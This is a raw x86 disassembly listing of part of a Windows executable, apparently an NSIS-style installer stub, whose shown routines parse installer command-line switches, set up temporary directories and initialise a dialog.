  403bd9:	33 c0                	xor    %eax,%eax
  403bdb:	c9                   	leave
  403bdc:	c2 10 00             	ret    $0x10
  403bdf:	a1 10 c0 40 00       	mov    0x40c010,%eax
  403be4:	83 f8 ff             	cmp    $0xffffffff,%eax
  403be7:	74 0e                	je     0x403bf7
  403be9:	50                   	push   %eax
  403bea:	ff 15 10 91 40 00    	call   *0x409110
  403bf0:	83 0d 10 c0 40 00 ff 	orl    $0xffffffff,0x40c010
  403bf7:	e8 2b 06 00 00       	call   0x404227
  403bfc:	6a 07                	push   $0x7
  403bfe:	68 00 70 4e 00       	push   $0x4e7000
  403c03:	e8 4d 33 00 00       	call   0x406f55
  403c08:	c3                   	ret
  403c09:	81 ec ec 03 00 00    	sub    $0x3ec,%esp
  403c0f:	53                   	push   %ebx
  403c10:	55                   	push   %ebp
  403c11:	56                   	push   %esi
  403c12:	57                   	push   %edi
  403c13:	33 db                	xor    %ebx,%ebx
  403c15:	bf 38 a2 40 00       	mov    $0x40a238,%edi
  403c1a:	68 01 80 00 00       	push   $0x8001
  403c1f:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  403c23:	8b eb                	mov    %ebx,%ebp
  403c25:	ff 15 b8 90 40 00    	call   *0x4090b8
  403c2b:	8b 35 a8 90 40 00    	mov    0x4090a8,%esi
  403c31:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403c35:	0f 57 c0             	xorps  %xmm0,%xmm0
  403c38:	89 5c 24 40          	mov    %ebx,0x40(%esp)
  403c3c:	50                   	push   %eax
  403c3d:	66 0f 13 84 24 44 01 	movlpd %xmm0,0x144(%esp)
  403c44:	00 00 
  403c46:	c7 44 24 30 1c 01 00 	movl   $0x11c,0x30(%esp)
  403c4d:	00 
  403c4e:	ff d6                	call   *%esi
  403c50:	85 c0                	test   %eax,%eax
  403c52:	75 37                	jne    0x403c8b
  403c54:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403c58:	c7 44 24 2c 14 01 00 	movl   $0x114,0x2c(%esp)
  403c5f:	00 
  403c60:	50                   	push   %eax
  403c61:	ff d6                	call   *%esi
  403c63:	6a 53                	push   $0x53
  403c65:	58                   	pop    %eax
  403c66:	b2 04                	mov    $0x4,%dl
  403c68:	88 94 24 46 01 00 00 	mov    %dl,0x146(%esp)
  403c6f:	66 39 44 24 40       	cmp    %ax,0x40(%esp)
  403c74:	75 11                	jne    0x403c87
  403c76:	8b 44 24 5a          	mov    0x5a(%esp),%eax
  403c7a:	83 c0 d0             	add    $0xffffffd0,%eax
  403c7d:	66 89 84 24 40 01 00 	mov    %ax,0x140(%esp)
  403c84:	00 
  403c85:	eb 0b                	jmp    0x403c92
  403c87:	33 c0                	xor    %eax,%eax
  403c89:	eb f2                	jmp    0x403c7d
  403c8b:	8a 94 24 46 01 00 00 	mov    0x146(%esp),%dl
  403c92:	83 7c 24 30 0a       	cmpl   $0xa,0x30(%esp)
  403c97:	73 0b                	jae    0x403ca4
  403c99:	0f b7 44 24 38       	movzwl 0x38(%esp),%eax
  403c9e:	89 44 24 38          	mov    %eax,0x38(%esp)
  403ca2:	eb 04                	jmp    0x403ca8
  403ca4:	8b 44 24 38          	mov    0x38(%esp),%eax
  403ca8:	a3 18 e3 47 00       	mov    %eax,0x47e318
  403cad:	0f b6 44 24 30       	movzbl 0x30(%esp),%eax
  403cb2:	66 c1 e0 08          	shl    $0x8,%ax
  403cb6:	0f b7 c8             	movzwl %ax,%ecx
  403cb9:	0f b6 44 24 34       	movzbl 0x34(%esp),%eax
  403cbe:	0b c8                	or     %eax,%ecx
  403cc0:	0f b6 84 24 40 01 00 	movzbl 0x140(%esp),%eax
  403cc7:	00 
  403cc8:	66 c1 e0 08          	shl    $0x8,%ax
  403ccc:	c1 e1 10             	shl    $0x10,%ecx
  403ccf:	0f b7 c0             	movzwl %ax,%eax
  403cd2:	0b c8                	or     %eax,%ecx
  403cd4:	0f b6 c2             	movzbl %dl,%eax
  403cd7:	0b c8                	or     %eax,%ecx
  403cd9:	b8 00 06 00 00       	mov    $0x600,%eax
  403cde:	89 0d 1c e3 47 00    	mov    %ecx,0x47e31c
  403ce4:	c1 f9 10             	sar    $0x10,%ecx
  403ce7:	66 3b c8             	cmp    %ax,%cx
  403cea:	74 11                	je     0x403cfd
  403cec:	53                   	push   %ebx
  403ced:	e8 8a 34 00 00       	call   0x40717c
  403cf2:	85 c0                	test   %eax,%eax
  403cf4:	74 07                	je     0x403cfd
  403cf6:	68 00 0c 00 00       	push   $0xc00
  403cfb:	ff d0                	call   *%eax
  403cfd:	be e0 a1 40 00       	mov    $0x40a1e0,%esi
  403d02:	56                   	push   %esi
  403d03:	e8 6c 2a 00 00       	call   0x406774
  403d08:	56                   	push   %esi
  403d09:	ff 15 e4 90 40 00    	call   *0x4090e4
  403d0f:	46                   	inc    %esi
  403d10:	03 f0                	add    %eax,%esi
  403d12:	38 1e                	cmp    %bl,(%esi)
  403d14:	75 ec                	jne    0x403d02
  403d16:	6a 0b                	push   $0xb
  403d18:	e8 5f 34 00 00       	call   0x40717c
  403d1d:	6a 09                	push   $0x9
  403d1f:	e8 58 34 00 00       	call   0x40717c
  403d24:	6a 07                	push   $0x7
  403d26:	a3 10 62 47 00       	mov    %eax,0x476210
  403d2b:	e8 4c 34 00 00       	call   0x40717c
  403d30:	85 c0                	test   %eax,%eax
  403d32:	74 0f                	je     0x403d43
  403d34:	6a 1e                	push   $0x1e
  403d36:	ff d0                	call   *%eax
  403d38:	85 c0                	test   %eax,%eax
  403d3a:	74 07                	je     0x403d43
  403d3c:	80 0d 1c e3 47 00 80 	orb    $0x80,0x47e31c
  403d43:	ff 15 38 90 40 00    	call   *0x409038
  403d49:	53                   	push   %ebx
  403d4a:	ff 15 a4 92 40 00    	call   *0x4092a4
  403d50:	53                   	push   %ebx
  403d51:	68 b4 02 00 00       	push   $0x2b4
  403d56:	a3 80 e2 47 00       	mov    %eax,0x47e280
  403d5b:	8d 84 24 50 01 00 00 	lea    0x150(%esp),%eax
  403d62:	50                   	push   %eax
  403d63:	53                   	push   %ebx
  403d64:	68 c0 a2 40 00       	push   $0x40a2c0
  403d69:	ff 15 84 91 40 00    	call   *0x409184
  403d6f:	68 c4 a2 40 00       	push   $0x40a2c4
  403d74:	68 20 62 47 00       	push   $0x476220
  403d79:	e8 32 36 00 00       	call   0x4073b0
  403d7e:	ff 15 c4 90 40 00    	call   *0x4090c4
  403d84:	50                   	push   %eax
  403d85:	68 00 f0 4c 00       	push   $0x4cf000
  403d8a:	e8 21 36 00 00       	call   0x4073b0
  403d8f:	0f b7 0d 00 f0 4c 00 	movzwl 0x4cf000,%ecx
  403d96:	ba 02 f0 4c 00       	mov    $0x4cf002,%edx
  403d9b:	6a 22                	push   $0x22
  403d9d:	5e                   	pop    %esi
  403d9e:	6a 20                	push   $0x20
  403da0:	5b                   	pop    %ebx
  403da1:	66 3b ce             	cmp    %si,%cx
  403da4:	c7 05 14 62 47 00 00 	movl   $0x400000,0x476214
  403dab:	00 40 00 
  403dae:	8b c6                	mov    %esi,%eax
  403db0:	89 74 24 18          	mov    %esi,0x18(%esp)
  403db4:	0f 45 c3             	cmovne %ebx,%eax
  403db7:	0f b7 c0             	movzwl %ax,%eax
  403dba:	50                   	push   %eax
  403dbb:	b8 00 f0 4c 00       	mov    $0x4cf000,%eax
  403dc0:	0f 44 c2             	cmove  %edx,%eax
  403dc3:	50                   	push   %eax
  403dc4:	e8 9b 2f 00 00       	call   0x406d64
  403dc9:	50                   	push   %eax
  403dca:	ff 15 18 92 40 00    	call   *0x409218
  403dd0:	8b c8                	mov    %eax,%ecx
  403dd2:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  403dd6:	0f b7 01             	movzwl (%ecx),%eax
  403dd9:	66 85 c0             	test   %ax,%ax
  403ddc:	0f 84 d5 00 00 00    	je     0x403eb7
  403de2:	8b f0                	mov    %eax,%esi
  403de4:	0f b7 c6             	movzwl %si,%eax
  403de7:	66 3b f3             	cmp    %bx,%si
  403dea:	75 0b                	jne    0x403df7
  403dec:	83 c1 02             	add    $0x2,%ecx
  403def:	0f b7 01             	movzwl (%ecx),%eax
  403df2:	66 3b c3             	cmp    %bx,%ax
  403df5:	74 f5                	je     0x403dec
  403df7:	0f b7 f0             	movzwl %ax,%esi
  403dfa:	0f b7 d0             	movzwl %ax,%edx
  403dfd:	66 3b 44 24 18       	cmp    0x18(%esp),%ax
  403e02:	75 09                	jne    0x403e0d
  403e04:	0f b7 51 02          	movzwl 0x2(%ecx),%edx
  403e08:	6a 22                	push   $0x22
  403e0a:	58                   	pop    %eax
  403e0b:	8b d8                	mov    %eax,%ebx
  403e0d:	66 3b 74 24 18       	cmp    0x18(%esp),%si
  403e12:	8d 41 02             	lea    0x2(%ecx),%eax
  403e15:	0f 45 c1             	cmovne %ecx,%eax
  403e18:	66 83 fa 2f          	cmp    $0x2f,%dx
  403e1c:	75 59                	jne    0x403e77
  403e1e:	6a 53                	push   $0x53
  403e20:	83 c0 02             	add    $0x2,%eax
  403e23:	59                   	pop    %ecx
  403e24:	6a 20                	push   $0x20
  403e26:	5a                   	pop    %edx
  403e27:	66 39 08             	cmp    %cx,(%eax)
  403e2a:	75 18                	jne    0x403e44
  403e2c:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  403e30:	66 3b ca             	cmp    %dx,%cx
  403e33:	74 05                	je     0x403e3a
  403e35:	66 85 c9             	test   %cx,%cx
  403e38:	75 0a                	jne    0x403e44
  403e3a:	c7 05 00 e3 47 00 01 	movl   $0x1,0x47e300
  403e41:	00 00 00 
  403e44:	81 38 4e 00 43 00    	cmpl   $0x43004e,(%eax)
  403e4a:	75 1a                	jne    0x403e66
  403e4c:	81 78 04 52 00 43 00 	cmpl   $0x430052,0x4(%eax)
  403e53:	75 11                	jne    0x403e66
  403e55:	0f b7 48 08          	movzwl 0x8(%eax),%ecx
  403e59:	66 3b ca             	cmp    %dx,%cx
  403e5c:	74 05                	je     0x403e63
  403e5e:	66 85 c9             	test   %cx,%cx
  403e61:	75 03                	jne    0x403e66
  403e63:	83 cd 04             	or     $0x4,%ebp
  403e66:	81 78 fc 20 00 2f 00 	cmpl   $0x2f0020,-0x4(%eax)
  403e6d:	75 08                	jne    0x403e77
  403e6f:	81 38 44 00 3d 00    	cmpl   $0x3d0044,(%eax)
  403e75:	74 2c                	je     0x403ea3
  403e77:	53                   	push   %ebx
  403e78:	50                   	push   %eax
  403e79:	e8 e6 2e 00 00       	call   0x406d64
  403e7e:	8b c8                	mov    %eax,%ecx
  403e80:	6a 22                	push   $0x22
  403e82:	5b                   	pop    %ebx
  403e83:	0f b7 01             	movzwl (%ecx),%eax
  403e86:	8b d0                	mov    %eax,%edx
  403e88:	66 3b c3             	cmp    %bx,%ax
  403e8b:	75 06                	jne    0x403e93
  403e8d:	83 c1 02             	add    $0x2,%ecx
  403e90:	0f b7 11             	movzwl (%ecx),%edx
  403e93:	0f b7 f2             	movzwl %dx,%esi
  403e96:	66 85 d2             	test   %dx,%dx
  403e99:	74 1c                	je     0x403eb7
  403e9b:	6a 20                	push   $0x20
  403e9d:	5b                   	pop    %ebx
  403e9e:	e9 41 ff ff ff       	jmp    0x403de4
  403ea3:	33 c9                	xor    %ecx,%ecx
  403ea5:	66 89 48 fc          	mov    %cx,-0x4(%eax)
  403ea9:	83 c0 04             	add    $0x4,%eax
  403eac:	50                   	push   %eax
  403ead:	68 00 30 4d 00       	push   $0x4d3000
  403eb2:	e8 f9 34 00 00       	call   0x4073b0
  403eb7:	8b 35 70 91 40 00    	mov    0x409170,%esi
  403ebd:	bb 00 30 4e 00       	mov    $0x4e3000,%ebx
  403ec2:	53                   	push   %ebx
  403ec3:	68 00 20 00 00       	push   $0x2000
  403ec8:	ff d6                	call   *%esi
  403eca:	e8 ea 02 00 00       	call   0x4041b9
  403ecf:	85 c0                	test   %eax,%eax
  403ed1:	75 56                	jne    0x403f29
  403ed3:	68 fb 1f 00 00       	push   $0x1ffb
  403ed8:	53                   	push   %ebx
  403ed9:	ff 15 ac 90 40 00    	call   *0x4090ac
  403edf:	68 dc a2 40 00       	push   $0x40a2dc
  403ee4:	53                   	push   %ebx
  403ee5:	e8 c0 34 00 00       	call   0x4073aa
  403eea:	e8 ca 02 00 00       	call   0x4041b9
  403eef:	85 c0                	test   %eax,%eax
  403ef1:	75 36                	jne    0x403f29
  403ef3:	53                   	push   %ebx
  403ef4:	68 fc 1f 00 00       	push   $0x1ffc
  403ef9:	ff d6                	call   *%esi
  403efb:	68 e8 a2 40 00       	push   $0x40a2e8
  403f00:	53                   	push   %ebx
  403f01:	e8 a4 34 00 00       	call   0x4073aa
  403f06:	8b 35 c0 90 40 00    	mov    0x4090c0,%esi
  403f0c:	53                   	push   %ebx
  403f0d:	68 f0 a2 40 00       	push   $0x40a2f0
  403f12:	ff d6                	call   *%esi
  403f14:	53                   	push   %ebx
  403f15:	68 fc a2 40 00       	push   $0x40a2fc
  403f1a:	ff d6                	call   *%esi
  403f1c:	e8 98 02 00 00       	call   0x4041b9
  403f21:	85 c0                	test   %eax,%eax
  403f23:	0f 84 cf 01 00 00    	je     0x4040f8
  403f29:	8b 1d 3c 91 40 00    	mov    0x40913c,%ebx
  403f2f:	68 00 f0 4d 00       	push   $0x4df000
  403f34:	ff d3                	call   *%ebx
  403f36:	55                   	push   %ebp
  403f37:	e8 be f9 ff ff       	call   0x4038fa
  403f3c:	8b f8                	mov    %eax,%edi
  403f3e:	33 ed                	xor    %ebp,%ebp
  403f40:	85 ff                	test   %edi,%edi
  403f42:	0f 85 b2 01 00 00    	jne    0x4040fa
  403f48:	39 2d 24 e2 47 00    	cmp    %ebp,0x47e224
  403f4e:	74 63                	je     0x403fb3
  403f50:	55                   	push   %ebp
  403f51:	68 00 f0 4c 00       	push   $0x4cf000
  403f56:	e8 09 2e 00 00       	call   0x406d64
  403f5b:	8b f0                	mov    %eax,%esi
  403f5d:	b8 00 f0 4c 00       	mov    $0x4cf000,%eax
  403f62:	eb 14                	jmp    0x403f78
  403f64:	81 3e 20 00 5f 00    	cmpl   $0x5f0020,(%esi)
  403f6a:	75 09                	jne    0x403f75
  403f6c:	81 7e 04 3f 00 3d 00 	cmpl   $0x3d003f,0x4(%esi)
  403f73:	74 07                	je     0x403f7c
  403f75:	83 ee 02             	sub    $0x2,%esi
  403f78:	3b f0                	cmp    %eax,%esi
  403f7a:	73 e8                	jae    0x403f64
  403f7c:	bf f8 9f 40 00       	mov    $0x409ff8,%edi
  403f81:	3b f0                	cmp    %eax,%esi
  403f83:	72 48                	jb     0x403fcd
  403f85:	33 c0                	xor    %eax,%eax
  403f87:	66 89 06             	mov    %ax,(%esi)
  403f8a:	83 c6 08             	add    $0x8,%esi
  403f8d:	56                   	push   %esi
  403f8e:	e8 13 2e 00 00       	call   0x406da6
  403f93:	85 c0                	test   %eax,%eax
  403f95:	0f 84 59 01 00 00    	je     0x4040f4
  403f9b:	56                   	push   %esi
  403f9c:	68 00 30 4d 00       	push   $0x4d3000
  403fa1:	e8 0a 34 00 00       	call   0x4073b0
  403fa6:	56                   	push   %esi
  403fa7:	68 00 70 4d 00       	push   $0x4d7000
  403fac:	e8 ff 33 00 00       	call   0x4073b0
  403fb1:	8b fd                	mov    %ebp,%edi
  403fb3:	83 0d 0c e3 47 00 ff 	orl    $0xffffffff,0x47e30c
  403fba:	e8 2b 20 00 00       	call   0x405fea
  403fbf:	6a 01                	push   $0x1
  403fc1:	8b d8                	mov    %eax,%ebx
  403fc3:	e8 8e 2e 00 00       	call   0x406e56
  403fc8:	e9 31 01 00 00       	jmp    0x4040fe
  403fcd:	e8 00 2b 00 00       	call   0x406ad2
  403fd2:	68 04 a3 40 00       	push   $0x40a304
  403fd7:	68 00 30 4e 00       	push   $0x4e3000
  403fdc:	8b f0                	mov    %eax,%esi
  403fde:	e8 c7 33 00 00       	call   0x4073aa
  403fe3:	85 f6                	test   %esi,%esi
  403fe5:	74 0f                	je     0x403ff6
  403fe7:	68 10 a3 40 00       	push   $0x40a310
  403fec:	68 00 30 4e 00       	push   $0x4e3000
  403ff1:	e8 b4 33 00 00       	call   0x4073aa
  403ff6:	68 14 a3 40 00       	push   $0x40a314
  403ffb:	68 00 30 4e 00       	push   $0x4e3000
  404000:	e8 a5 33 00 00       	call   0x4073aa
  404005:	68 00 b0 4d 00       	push   $0x4db000
  40400a:	68 00 30 4e 00       	push   $0x4e3000
  40400f:	ff 15 e8 90 40 00    	call   *0x4090e8
  404015:	85 c0                	test   %eax,%eax
  404017:	0f 84 d7 00 00 00    	je     0x4040f4
  40401d:	68 00 30 4e 00       	push   $0x4e3000
  404022:	85 f6                	test   %esi,%esi
  404024:	74 07                	je     0x40402d
  404026:	e8 ea 23 00 00       	call   0x406415
  40402b:	eb 05                	jmp    0x404032
  40402d:	e8 c3 23 00 00       	call   0x4063f5
  404032:	68 00 30 4e 00       	push   $0x4e3000
  404037:	ff 15 48 91 40 00    	call   *0x409148
  40403d:	66 39 2d 00 30 4d 00 	cmp    %bp,0x4d3000
  404044:	75 0f                	jne    0x404055
  404046:	68 00 b0 4d 00       	push   $0x4db000
  40404b:	68 00 30 4d 00       	push   $0x4d3000
  404050:	e8 5b 33 00 00       	call   0x4073b0
  404055:	ff 74 24 14          	push   0x14(%esp)
  404059:	68 00 f0 47 00       	push   $0x47f000
  40405e:	e8 4d 33 00 00       	call   0x4073b0
  404063:	6a 1a                	push   $0x1a
  404065:	c7 05 00 30 48 00 41 	movl   $0x41,0x483000
  40406c:	00 00 00 
  40406f:	5e                   	pop    %esi
  404070:	a1 30 e2 47 00       	mov    0x47e230,%eax
  404075:	ff b0 20 01 00 00    	push   0x120(%eax)
  40407b:	68 38 dd 43 00       	push   $0x43dd38
  404080:	e8 0c 24 00 00       	call   0x406491
  404085:	68 38 dd 43 00       	push   $0x43dd38
  40408a:	ff d3                	call   *%ebx
  40408c:	85 ff                	test   %edi,%edi
  40408e:	74 4d                	je     0x4040dd
  404090:	6a 01                	push   $0x1
  404092:	68 38 dd 43 00       	push   $0x43dd38
  404097:	68 00 b0 4e 00       	push   $0x4eb000
  40409c:	ff 15 a4 90 40 00    	call   *0x4090a4
  4040a2:	85 c0                	test   %eax,%eax
  4040a4:	74 37                	je     0x4040dd
  4040a6:	55                   	push   %ebp
  4040a7:	68 38 dd 43 00       	push   $0x43dd38
  4040ac:	e8 62 27 00 00       	call   0x406813
  4040b1:	a1 30 e2 47 00       	mov    0x47e230,%eax
  4040b6:	ff b0 24 01 00 00    	push   0x124(%eax)
  4040bc:	68 38 dd 43 00       	push   $0x43dd38
  4040c1:	e8 cb 23 00 00       	call   0x406491
  4040c6:	68 38 dd 43 00       	push   $0x43dd38
  4040cb:	e8 42 2e 00 00       	call   0x406f12
  4040d0:	85 c0                	test   %eax,%eax
  4040d2:	74 09                	je     0x4040dd
  4040d4:	50                   	push   %eax
  4040d5:	ff 15 10 91 40 00    	call   *0x409110
  4040db:	8b fd                	mov    %ebp,%edi
  4040dd:	66 ff 05 00 30 48 00 	incw   0x483000
  4040e4:	83 ee 01             	sub    $0x1,%esi
  4040e7:	75 87                	jne    0x404070
  4040e9:	55                   	push   %ebp
  4040ea:	68 00 30 4e 00       	push   $0x4e3000
  4040ef:	e8 1f 27 00 00       	call   0x406813
  4040f4:	8b dd                	mov    %ebp,%ebx
  4040f6:	eb 06                	jmp    0x4040fe
  4040f8:	33 ed                	xor    %ebp,%ebp
  4040fa:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4040fe:	e8 dc fa ff ff       	call   0x403bdf
  404103:	ff 15 a8 92 40 00    	call   *0x4092a8
  404109:	85 ff                	test   %edi,%edi
  40410b:	74 13                	je     0x404120
  40410d:	68 10 00 20 00       	push   $0x200010
  404112:	57                   	push   %edi
  404113:	e8 26 32 00 00       	call   0x40733e
  404118:	6a 02                	push   $0x2
  40411a:	ff 15 b0 90 40 00    	call   *0x4090b0
  404120:	83 3d f4 e2 47 00 00 	cmpl   $0x0,0x47e2f4
  404127:	74 7c                	je     0x4041a5
  404129:	8d 44 24 14          	lea    0x14(%esp),%eax
  40412d:	50                   	push   %eax
  40412e:	6a 28                	push   $0x28
  404130:	ff 15 b4 90 40 00    	call   *0x4090b4
  404136:	50                   	push   %eax
  404137:	ff 15 1c 90 40 00    	call   *0x40901c
  40413d:	85 c0                	test   %eax,%eax
  40413f:	74 34                	je     0x404175
  404141:	8d 44 24 20          	lea    0x20(%esp),%eax
  404145:	50                   	push   %eax
  404146:	68 20 a3 40 00       	push   $0x40a320
  40414b:	55                   	push   %ebp
  40414c:	ff 15 24 90 40 00    	call   *0x409024
  404152:	55                   	push   %ebp
  404153:	55                   	push   %ebp
  404154:	55                   	push   %ebp
  404155:	8d 44 24 28          	lea    0x28(%esp),%eax
  404159:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%esp)
  404160:	00 
  404161:	50                   	push   %eax
  404162:	55                   	push   %ebp
  404163:	ff 74 24 28          	push   0x28(%esp)
  404167:	c7 44 24 40 02 00 00 	movl   $0x2,0x40(%esp)
  40416e:	00 
  40416f:	ff 15 20 90 40 00    	call   *0x409020
  404175:	6a 04                	push   $0x4
  404177:	e8 00 30 00 00       	call   0x40717c
  40417c:	be 02 00 04 80       	mov    $0x80040002,%esi
  404181:	85 c0                	test   %eax,%eax
  404183:	74 0c                	je     0x404191
  404185:	56                   	push   %esi
  404186:	6a 25                	push   $0x25
  404188:	55                   	push   %ebp
  404189:	55                   	push   %ebp
  40418a:	55                   	push   %ebp
  40418b:	ff d0                	call   *%eax
  40418d:	85 c0                	test   %eax,%eax
  40418f:	74 0d                	je     0x40419e
  404191:	56                   	push   %esi
  404192:	6a 02                	push   $0x2
  404194:	ff 15 1c 92 40 00    	call   *0x40921c
  40419a:	85 c0                	test   %eax,%eax
  40419c:	75 07                	jne    0x4041a5
  40419e:	6a 09                	push   $0x9
  4041a0:	e8 97 d3 ff ff       	call   0x40153c
  4041a5:	83 3d 0c e3 47 00 ff 	cmpl   $0xffffffff,0x47e30c
  4041ac:	0f 45 1d 0c e3 47 00 	cmovne 0x47e30c,%ebx
  4041b3:	53                   	push   %ebx
  4041b4:	e9 61 ff ff ff       	jmp    0x40411a
  4041b9:	56                   	push   %esi
  4041ba:	be 00 30 4e 00       	mov    $0x4e3000,%esi
  4041bf:	56                   	push   %esi
  4041c0:	e8 0e 34 00 00       	call   0x4075d3
  4041c5:	56                   	push   %esi
  4041c6:	e8 cc 34 00 00       	call   0x407697
  4041cb:	85 c0                	test   %eax,%eax
  4041cd:	75 02                	jne    0x4041d1
  4041cf:	5e                   	pop    %esi
  4041d0:	c3                   	ret
  4041d1:	56                   	push   %esi
  4041d2:	e8 ed 2a 00 00       	call   0x406cc4
  4041d7:	56                   	push   %esi
  4041d8:	e8 18 22 00 00       	call   0x4063f5
  4041dd:	56                   	push   %esi
  4041de:	68 00 f0 4d 00       	push   $0x4df000
  4041e3:	e8 04 31 00 00       	call   0x4072ec
  4041e8:	5e                   	pop    %esi
  4041e9:	c3                   	ret
  4041ea:	a1 38 1d 44 00       	mov    0x441d38,%eax
  4041ef:	85 c0                	test   %eax,%eax
  4041f1:	74 0f                	je     0x404202
  4041f3:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4041f7:	39 48 08             	cmp    %ecx,0x8(%eax)
  4041fa:	74 0c                	je     0x404208
  4041fc:	8b 00                	mov    (%eax),%eax
  4041fe:	85 c0                	test   %eax,%eax
  404200:	75 f5                	jne    0x4041f7
  404202:	33 c0                	xor    %eax,%eax
  404204:	40                   	inc    %eax
  404205:	c2 04 00             	ret    $0x4
  404208:	33 c0                	xor    %eax,%eax
  40420a:	eb f9                	jmp    0x404205
  40420c:	56                   	push   %esi
  40420d:	8b 35 38 1d 44 00    	mov    0x441d38,%esi
  404213:	eb 0a                	jmp    0x40421f
  404215:	ff 74 24 08          	push   0x8(%esp)
  404219:	ff 56 04             	call   *0x4(%esi)
  40421c:	8b 36                	mov    (%esi),%esi
  40421e:	59                   	pop    %ecx
  40421f:	85 f6                	test   %esi,%esi
  404221:	75 f2                	jne    0x404215
  404223:	5e                   	pop    %esi
  404224:	c2 04 00             	ret    $0x4
  404227:	57                   	push   %edi
  404228:	8b 3d 38 1d 44 00    	mov    0x441d38,%edi
  40422e:	6a 00                	push   $0x0
  404230:	e8 d7 ff ff ff       	call   0x40420c
  404235:	85 ff                	test   %edi,%edi
  404237:	74 1a                	je     0x404253
  404239:	56                   	push   %esi
  40423a:	8b f7                	mov    %edi,%esi
  40423c:	8b 3f                	mov    (%edi),%edi
  40423e:	ff 76 08             	push   0x8(%esi)
  404241:	ff 15 04 91 40 00    	call   *0x409104
  404247:	56                   	push   %esi
  404248:	ff 15 f4 90 40 00    	call   *0x4090f4
  40424e:	85 ff                	test   %edi,%edi
  404250:	75 e8                	jne    0x40423a
  404252:	5e                   	pop    %esi
  404253:	83 25 38 1d 44 00 00 	andl   $0x0,0x441d38
  40425a:	5f                   	pop    %edi
  40425b:	c3                   	ret
  40425c:	56                   	push   %esi
  40425d:	8b 74 24 08          	mov    0x8(%esp),%esi
  404261:	56                   	push   %esi
  404262:	e8 83 ff ff ff       	call   0x4041ea
  404267:	85 c0                	test   %eax,%eax
  404269:	75 03                	jne    0x40426e
  40426b:	40                   	inc    %eax
  40426c:	eb 2c                	jmp    0x40429a
  40426e:	6a 0c                	push   $0xc
  404270:	6a 40                	push   $0x40
  404272:	ff 15 f8 90 40 00    	call   *0x4090f8
  404278:	85 c0                	test   %eax,%eax
  40427a:	74 1b                	je     0x404297
  40427c:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  404280:	89 48 04             	mov    %ecx,0x4(%eax)
  404283:	8b 0d 38 1d 44 00    	mov    0x441d38,%ecx
  404289:	89 70 08             	mov    %esi,0x8(%eax)
  40428c:	89 08                	mov    %ecx,(%eax)
  40428e:	a3 38 1d 44 00       	mov    %eax,0x441d38
  404293:	33 c0                	xor    %eax,%eax
  404295:	eb 03                	jmp    0x40429a
  404297:	83 c8 ff             	or     $0xffffffff,%eax
  40429a:	5e                   	pop    %esi
  40429b:	c2 08 00             	ret    $0x8
  40429e:	83 ec 48             	sub    $0x48,%esp
  4042a1:	81 7c 24 50 10 01 00 	cmpl   $0x110,0x50(%esp)
  4042a8:	00 
  4042a9:	53                   	push   %ebx
  4042aa:	55                   	push   %ebp
  4042ab:	56                   	push   %esi
  4042ac:	8b 35 4c 1d 45 00    	mov    0x451d4c,%esi
  4042b2:	57                   	push   %edi
  4042b3:	0f 85 25 01 00 00    	jne    0x4043de
  4042b9:	8b 54 24 68          	mov    0x68(%esp),%edx
  4042bd:	8b 4a 30             	mov    0x30(%edx),%ecx
  4042c0:	85 c9                	test   %ecx,%ecx
  4042c2:	79 11                	jns    0x4042d5
  4042c4:	8d 04 8d 04 00 00 00 	lea    0x4(,%ecx,4),%eax
  4042cb:	8b 0d 00 62 47 00    	mov    0x476200,%ecx
  4042d1:	2b c8                	sub    %eax,%ecx
  4042d3:	8b 09                	mov    (%ecx),%ecx
  4042d5:	a1 58 e2 47 00       	mov    0x47e258,%eax
  4042da:	33 db                	xor    %ebx,%ebx
  4042dc:	8b 7a 14             	mov    0x14(%edx),%edi
  4042df:	be 08 5c 40 00       	mov    $0x405c08,%esi
  4042e4:	ff 72 34             	push   0x34(%edx)
  4042e7:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  4042ea:	0f b7 08             	movzwl (%eax),%ecx
  4042ed:	83 c0 02             	add    $0x2,%eax
  4042f0:	89 44 24 64          	mov    %eax,0x64(%esp)
  4042f4:	83 f9 02             	cmp    $0x2,%ecx
  4042f7:	89 44 24 14          	mov    %eax,0x14(%esp)
  4042fb:	b8 d1 5b 40 00       	mov    $0x405bd1,%eax
  404300:	0f 44 c6             	cmove  %esi,%eax
  404303:	89 4c 24 68          	mov    %ecx,0x68(%esp)
  404307:	8b 74 24 60          	mov    0x60(%esp),%esi
  40430b:	33 ed                	xor    %ebp,%ebp
  40430d:	c1 ef 05             	shr    $0x5,%edi
  404310:	45                   	inc    %ebp
  404311:	f7 d7                	not    %edi
  404313:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  404317:	0b 7a 14             	or     0x14(%edx),%edi
  40431a:	6a 22                	push   $0x22
  40431c:	56                   	push   %esi
  40431d:	89 44 24 24          	mov    %eax,0x24(%esp)
  404321:	23 fd                	and    %ebp,%edi
  404323:	e8 6e 17 00 00       	call   0x405a96
  404328:	8b 44 24 68          	mov    0x68(%esp),%eax
  40432c:	ff 70 38             	push   0x38(%eax)
  40432f:	6a 23                	push   $0x23
  404331:	56                   	push   %esi
  404332:	e8 5f 17 00 00       	call   0x405a96
  404337:	8b c7                	mov    %edi,%eax
  404339:	33 c5                	xor    %ebp,%eax
  40433b:	55                   	push   %ebp
  40433c:	05 0a 04 00 00       	add    $0x40a,%eax
  404341:	50                   	push   %eax
  404342:	56                   	push   %esi
  404343:	ff 15 f0 91 40 00    	call   *0x4091f0
  404349:	57                   	push   %edi
  40434a:	ff 35 54 1d 45 00    	push   0x451d54
  404350:	ff 15 4c 92 40 00    	call   *0x40924c
  404356:	68 e8 03 00 00       	push   $0x3e8
  40435b:	56                   	push   %esi
  40435c:	ff 15 50 92 40 00    	call   *0x409250
  404362:	8b f0                	mov    %eax,%esi
  404364:	56                   	push   %esi
  404365:	e8 15 17 00 00       	call   0x405a7f
  40436a:	8b 3d 64 92 40 00    	mov    0x409264,%edi
  404370:	53                   	push   %ebx
  404371:	55                   	push   %ebp
  404372:	68 5b 04 00 00       	push   $0x45b
  404377:	56                   	push   %esi
  404378:	ff d7                	call   *%edi
  40437a:	a1 30 e2 47 00       	mov    0x47e230,%eax
